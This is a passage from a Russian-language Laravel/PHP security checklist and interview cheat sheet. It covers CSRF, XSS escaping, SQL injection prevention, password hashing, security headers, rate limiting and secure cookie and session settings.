2. **APP_DEBUG=false** в production
3. **HTTPS** везде
4. **CSRF protection** - включена VerifyCsrfToken middleware
5. **XSS protection** - используй `{{ }}` в Blade, не `{!! !!}`
6. **SQL Injection** - Query Builder / Eloquent (не raw SQL)
7. **Password hashing** - Hash::make() (bcrypt)
8. **Validation** - всегда валидируй input
9. **Authorization** - Gates / Policies
10. **Rate limiting** - на login, API routes
11. **Security headers** - X-Frame-Options, CSP, HSTS
12. **composer audit** - регулярно проверяй зависимости
13. **File uploads** - валидация mime, хранение вне webroot
14. **Logging** - критичные события безопасности

### Security Headers Middleware

```php
// Зарегистрировать глобально
// app/Http/Kernel.php
protected $middleware = [
    \App\Http\Middleware\SecurityHeaders::class,
];
```

---

## 🎓 Для собеседования: ключевые точки

1. **OWASP Top 10** - знать топ-3: Broken Access Control, Injection, Cryptographic Failures
2. **SQL Injection** - prepared statements, Query Builder/Eloquent
3. **XSS** - output escaping, {{ }} в Blade, CSP headers
4. **CSRF** - @csrf токен, SameSite cookies
5. **Password hashing** - bcrypt/Argon2, НИКОГДА md5/sha1
6. **HTTPS** - всегда в production, HSTS header
7. **File uploads** - валидация mime, переименование, хранение вне webroot
8. **Laravel Gates/Policies** - для authorization
9. **Rate limiting** - против brute force
10. **Security headers** - X-Frame-Options, CSP, X-Content-Type-Options
11. **Session security** - session_regenerate_id() после login, HttpOnly/Secure/SameSite flags, session handlers (Redis для production)
12. **Cookie security** - Secure (только HTTPS), HttpOnly (защита от XSS), SameSite (Lax/Strict для CSRF защиты)

**Главное:** Defense in depth (многоуровневая защита), assume breach (предполагай взлом), least privilege (минимальные привилегии), всегда используй Secure+HttpOnly+SameSite для cookies.
